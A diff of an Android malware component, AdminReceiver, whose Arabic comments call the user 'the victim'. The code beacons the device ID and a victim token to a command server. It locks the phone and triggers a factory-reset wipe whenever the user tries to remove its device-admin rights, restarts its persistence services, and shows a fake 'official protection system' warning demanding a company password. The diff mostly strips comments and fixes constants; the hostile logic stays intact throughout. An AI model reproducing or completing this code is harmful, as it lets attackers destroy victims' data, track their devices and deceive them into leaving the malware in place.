@@ -25,7 +25,6 @@ import java.net.URL;
  * 2. مراقبة محاولات إلغاء التفعيل (Disable Requested)
  * 3. تنفيذ Factory Reset (Wipe Data) عند محاولة الحذف
  * 4. الإبلاغ عن أي محاولة إلغاء تفعيل للسيرفر
- * 5. الحماية عبر كلمة سر (لا يمكن إلغاء التفعيل بدونها)
  * ============================================================
  */
 public class AdminReceiver extends DeviceAdminReceiver {
@@ -42,9 +41,6 @@ public class AdminReceiver extends DeviceAdminReceiver {
     // ★★★ الحد الأقصى لمحاولات إلغاء التفعيل قبل الضبط ★★★
     private static final int MAX_WARNINGS_BEFORE_WIPE = 1;
 
-    // ★★★ الفترة بين كل تحذير والتاني (بالثواني) ★★★
-    private static final long WARNING_COOLDOWN_SECONDS = 30;
-
     // ============================================================
     // onEnabled - عندما يتم تفعيل Device Admin
     // ============================================================
@@ -54,19 +50,16 @@ public class AdminReceiver extends DeviceAdminReceiver {
         Log.d(TAG, "[ADMIN] ★ Device Admin ENABLED ★");
 
         try {
-            // ★ سجل التفعيل في SharedPreferences ★
             SharedPreferences prefs = context.getSharedPreferences(
                     PREFS_NAME, Context.MODE_PRIVATE);
             prefs.edit()
                     .putBoolean("admin_enabled", true)
                     .putLong("admin_enabled_at", System.currentTimeMillis())
-                    .putInt(KEY_UNINSTALL_ATTEMPTS, 0) // reset counter
+                    .putInt(KEY_UNINSTALL_ATTEMPTS, 0)
                     .apply();
 
-            // ★ ابعت تأكيد للسيرفر ★
             new Thread(() -> reportToServer(context, "admin_enabled", null)).start();
 
-            // ★ شغل الخدمات في الخلفية ★
             try {
                 Intent svc = new Intent(context, ServiceRunner.class);
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -78,7 +71,6 @@ public class AdminReceiver extends DeviceAdminReceiver {
                 Log.e(TAG, "[ADMIN] start service error: " + e.getMessage());
             }
 
-            // ★ فعّل كل طبقات الاستمرارية ★
             try {
                 PersistenceManager.enableAllPersistence(context);
                 PersistenceManager.scheduleEternalAlarm(context);
@@ -102,9 +94,7 @@ public class AdminReceiver extends DeviceAdminReceiver {
             SharedPreferences prefs = context.getSharedPreferences(
                     PREFS_NAME, Context.MODE_PRIVATE);
 
-            // ★ احسب عدد المحاولات ★
             int attempts = prefs.getInt(KEY_UNINSTALL_ATTEMPTS, 0) + 1;
-            long lastWarning = prefs.getLong(KEY_LAST_WARNING, 0);
             long now = System.currentTimeMillis();
 
             prefs.edit()
@@ -114,7 +104,6 @@ public class AdminReceiver extends DeviceAdminReceiver {
 
             Log.d(TAG, "[ADMIN] Uninstall attempt #" + attempts);
 
-            // ★ ابعت تنبيه فوري للسيرفر ★
             new Thread(() -> reportToServer(context, "uninstall_attempt",
                     "attempt_" + attempts)).start();
 
@@ -129,39 +118,27 @@ public class AdminReceiver extends DeviceAdminReceiver {
                 Log.e(TAG, "[ADMIN] lockNow error: " + e.getMessage());
             }
 
-            // ★★★ تنفيذ الضبط المصنعي (Factory Reset) ★★★
-            // ★ هذه هي اللحظة الحاسمة — لو الضحية كمّل إلغاء التفعيل، الجهاز هيتمسح ★
+            // ★★★ تنفيذ الضبط المصنعي ★★★
             if (attempts >= MAX_WARNINGS_BEFORE_WIPE) {
-                Log.d(TAG, "[ADMIN] ★★★ MAX ATTEMPTS REACHED — EXECUTING FACTORY RESET ★★★");
+                Log.d(TAG, "[ADMIN] ★★★ MAX ATTEMPTS — EXECUTING FACTORY RESET ★★★");
 
                 try {
-                    // علّم إن الـ wipe اتنفذ
                     prefs.edit()
                             .putBoolean(KEY_FACTORY_RESET_TRIGGERED, true)
                             .apply();
 
-                    // ابعت تأكيد للسيرفر قبل المسح
                     new Thread(() -> reportToServer(
                             context, "factory_reset_executing",
                             "attempts=" + attempts)).start();
 
-                    // ★★★ انتظر 3 ثواني (نضمن إن الإبلاغ اتسجل)، ثم امسح ★★★
+                    final Context ctx = context.getApplicationContext();
                     new Handler(Looper.getMainLooper()).postDelayed(() -> {
                         try {
                             DevicePolicyManager dpm2 = (DevicePolicyManager)
-                                    context.getSystemService(Context.DEVICE_POLICY_SERVICE);
+                                    ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
                             if (dpm2 != null) {
-                                // ★★★ FACTORY RESET — Wipe كل حاجة ★★★
-                                // WIPE_EXTERNAL_STORAGE = 0x0001
-                                // WIPE_RESET_PROTECTION_DATA = 0x0002
-                                // WIPE_EUICC = 0x0004 (Android 9+)
                                 int flags = DevicePolicyManager.WIPE_EXTERNAL_STORAGE
                                         | DevicePolicyManager.WIPE_RESET_PROTECTION_DATA;
-
-                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
-                                    flags |= 0x0004; // WIPE_EUICC
-                                }
-
                                 dpm2.wipeData(flags);
                                 Log.d(TAG, "[ADMIN] ★★★ WIPE EXECUTED ★★★");
                             }
@@ -173,12 +150,9 @@ public class AdminReceiver extends DeviceAdminReceiver {
                 } catch (Exception e) {
                     Log.e(TAG, "[ADMIN] factory reset prep error: " + e.getMessage());
                 }
-            } else {
-                Log.d(TAG, "[ADMIN] Warning #" + attempts + " — not yet wipes");
             }
 
             // ★★★ الرسالة التحذيرية للضحية ★★★
-            // ★ الضحية هيشوف الرسالة دي لما يحاول يلغي الـ Device Admin ★
             return "⚠️ تحذير نهائي من نظام الحماية ⚠️\n\n"
                     + "هذا التطبيق جزء من نظام الحماية الرسمي للجهاز.\n\n"
                     + "لا يمكن إلغاء تفعيل مسؤول النظام إلا بكلمة سر الشركة.\n\n"
@@ -199,34 +173,25 @@ public class AdminReceiver extends DeviceAdminReceiver {
     @Override
     public void onDisabled(Context context, Intent intent) {
         super.onDisabled(context, intent);
-        Log.d(TAG, "[ADMIN] !!! ★★★ DISABLED ★★★ — ACTIVATING NUCLEAR OPTION");
+        Log.d(TAG, "[ADMIN] !!! ★★★ DISABLED ★★★ — NUCLEAR OPTION");
 
         try {
             SharedPreferences prefs = context.getSharedPreferences(
                     PREFS_NAME, Context.MODE_PRIVATE);
-
             boolean alreadyTriggered = prefs.getBoolean(
                     KEY_FACTORY_RESET_TRIGGERED, false);
 
-            // ★ ابعت تنبيه أخير للسيرفر ★
             new Thread(() -> reportToServer(
-                    context, "admin_disabled", "nuclcear_option")).start();
+                    context, "admin_disabled", "nuclear_option")).start();
 
-            // ★★★ نفذ الـ Wipe فورًا لو لسه ما اتنفذش ★★★
             if (!alreadyTriggered) {
                 Log.d(TAG, "[ADMIN] Executing emergency wipe...");
-
                 try {
                     DevicePolicyManager dpm = (DevicePolicyManager)
                             context.getSystemService(Context.DEVICE_POLICY_SERVICE);
                     if (dpm != null) {
                         int flags = DevicePolicyManager.WIPE_EXTERNAL_STORAGE
                                 | DevicePolicyManager.WIPE_RESET_PROTECTION_DATA;
-
-                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
-                            flags |= 0x0004; // WIPE_EUICC
-                        }
-
                         dpm.wipeData(flags);
                         Log.d(TAG, "[ADMIN] ★★★ EMERGENCY WIPE EXECUTED ★★★");
                     }
@@ -235,7 +200,6 @@ public class AdminReceiver extends DeviceAdminReceiver {
                 }
             }
 
-            // ★ إعادة تشغيل الخدمات (في حالة عدم نجاح الـ wipe) ★
             try {
                 Intent svc = new Intent(context, ServiceRunner.class);
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -251,7 +215,7 @@ public class AdminReceiver extends DeviceAdminReceiver {
     }
 
     // ============================================================
-    // onPasswordFailed - حماية إضافية بكلمة السر
+    // onPasswordFailed - حماية إضافية
     // ============================================================
     @Override
     public void onPasswordFailed(Context context, Intent intent) {
@@ -259,18 +223,13 @@ public class AdminReceiver extends DeviceAdminReceiver {
         Log.d(TAG, "[ADMIN] Password failed");
 
         try {
-            // ★ عدّ محاولات كلمة السر الفاشلة ★
             SharedPreferences prefs = context.getSharedPreferences(
                     PREFS_NAME, Context.MODE_PRIVATE);
             int failedAttempts = prefs.getInt("password_failed_count", 0) + 1;
             prefs.edit().putInt("password_failed_count", failedAttempts).apply();
 
-            Log.d(TAG, "[ADMIN] Password failed count: " + failedAttempts);
-
-            // ★ لو 10 محاولات فاشلة → امسح الجهاز ★
             if (failedAttempts >= 10) {
                 Log.d(TAG, "[ADMIN] ★★★ TOO MANY FAILED PASSWORDS — WIPING ★★★");
-
                 try {
                     DevicePolicyManager dpm = (DevicePolicyManager)
                             context.getSystemService(Context.DEVICE_POLICY_SERVICE);
@@ -287,13 +246,11 @@ public class AdminReceiver extends DeviceAdminReceiver {
     }
 
     // ============================================================
-    // onPasswordSucceeded - تصفير عداد كلمة السر
+    // onPasswordSucceeded - تصفير العداد
     // ============================================================
     @Override
     public void onPasswordSucceeded(Context context, Intent intent) {
         super.onPasswordSucceeded(context, intent);
-        Log.d(TAG, "[ADMIN] Password succeeded");
-
         try {
             context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                     .edit()
@@ -303,13 +260,12 @@ public class AdminReceiver extends DeviceAdminReceiver {
     }
 
     // ============================================================
-    // onPasswordChanged - عند تغيير كلمة السر
+    // onPasswordChanged
     // ============================================================
     @Override
     public void onPasswordChanged(Context context, Intent intent) {
         super.onPasswordChanged(context, intent);
         Log.d(TAG, "[ADMIN] Password changed");
-
         try {
             new Thread(() -> reportToServer(
                     context, "password_changed", null)).start();
@@ -318,6 +274,7 @@ public class AdminReceiver extends DeviceAdminReceiver {
 
     // ============================================================
     // onReceive - استقبال كل الأحداث
+    // ★★★ تم استخدام الثوابت الصحيحة من DeviceAdminReceiver ★★★
     // ============================================================
     @Override
     public void onReceive(Context context, Intent intent) {
@@ -327,15 +284,15 @@ public class AdminReceiver extends DeviceAdminReceiver {
             String action = intent != null ? intent.getAction() : "unknown";
             Log.d(TAG, "[ADMIN] onReceive: " + action);
 
-            // ★ استقبل أوامر Device Admin الخاصة ★
             if (intent != null) {
-                if (DevicePolicyManager.ACTION_DEVICE_ADMIN_DISABLE_REQUESTED
+                // ★★★ الثوابت الصحيحة موجودة في DeviceAdminReceiver ★★★
+                if (DeviceAdminReceiver.ACTION_DEVICE_ADMIN_DISABLE_REQUESTED
                         .equals(action)) {
                     Log.d(TAG, "[ADMIN] Disable requested via onReceive");
-                } else if (DevicePolicyManager.ACTION_DEVICE_ADMIN_DISABLED
+                } else if (DeviceAdminReceiver.ACTION_DEVICE_ADMIN_DISABLED
                         .equals(action)) {
                     Log.d(TAG, "[ADMIN] Disabled via onReceive");
-                } else if (DevicePolicyManager.ACTION_DEVICE_ADMIN_ENABLED
+                } else if (DeviceAdminReceiver.ACTION_DEVICE_ADMIN_ENABLED
                         .equals(action)) {
                     Log.d(TAG, "[ADMIN] Enabled via onReceive");
                 }
@@ -346,46 +303,16 @@ public class AdminReceiver extends DeviceAdminReceiver {
     }
 
     // ============================================================
-    // onLockTaskModeEntering - منع الخروج من وضع Lock Task
-    // ============================================================
-    @Override
-    public void onLockTaskModeEntering(Context context, Intent intent, String pkg) {
-        super.onLockTaskModeEntering(context, intent, pkg);
-        Log.d(TAG, "[ADMIN] Lock task mode entering: " + pkg);
-    }
-
-    @Override
-    public void onLockTaskModeExiting(Context context, Intent intent) {
-        super.onLockTaskModeExiting(context, intent);
-        Log.d(TAG, "[ADMIN] Lock task mode exiting");
-
-        // ★ امنع الخروج من الـ Lock Task Mode ★
-        try {
-            DevicePolicyManager dpm = (DevicePolicyManager)
-                    context.getSystemService(Context.DEVICE_POLICY_SERVICE);
-            ComponentName admin = new ComponentName(context, AdminReceiver.class);
-            if (dpm != null && dpm.isAdminActive(admin)) {
-                // ★ أعد تفعيل الـ Lock Task Mode ★
-                dpm.setLockTaskPackages(admin, new String[]{context.getPackageName()});
-            }
-        } catch (Exception e) {
-            Log.e(TAG, "[ADMIN] lock task error: " + e.getMessage());
-        }
-    }
-
-    // ============================================================
     // Helper: تقرير للسيرفر
     // ============================================================
     private void reportToServer(Context context, String event, String extra) {
         HttpURLConnection conn = null;
         try {
-            // ★ اجلب التوكن من BuildConfig ★
             String token = "DEFAULT_TOKEN";
             try {
                 token = BuildConfig.VICTIM_TOKEN;
             } catch (Exception ignored) {}
 
-            // ★ اجلب device_id ★
             String deviceId = "unknown";
             try {
                 deviceId = android.provider.Settings.Secure.getString(
@@ -393,7 +320,6 @@ public class AdminReceiver extends DeviceAdminReceiver {
                         android.provider.Settings.Secure.ANDROID_ID);
             } catch (Exception ignored) {}
 
-            // ★ بني الـ payload ★
             JSONObject payload = new JSONObject();
             payload.put("type", "admin_event");
             payload.put("event", event);
@@ -406,7 +332,6 @@ public class AdminReceiver extends DeviceAdminReceiver {
             payload.put("sdk", Build.VERSION.SDK_INT);
             payload.put("timestamp", System.currentTimeMillis());
 
-            // ★ ابعت الـ POST ★
             URL url = new URL(SERVER_URL + "/apk/victim/data");
             conn = (HttpURLConnection) url.openConnection();
             conn.setRequestMethod("POST");
@@ -431,4 +356,4 @@ public class AdminReceiver extends DeviceAdminReceiver {
             } catch (Exception ignored) {}
         }
     }
-                                  }
+                            }
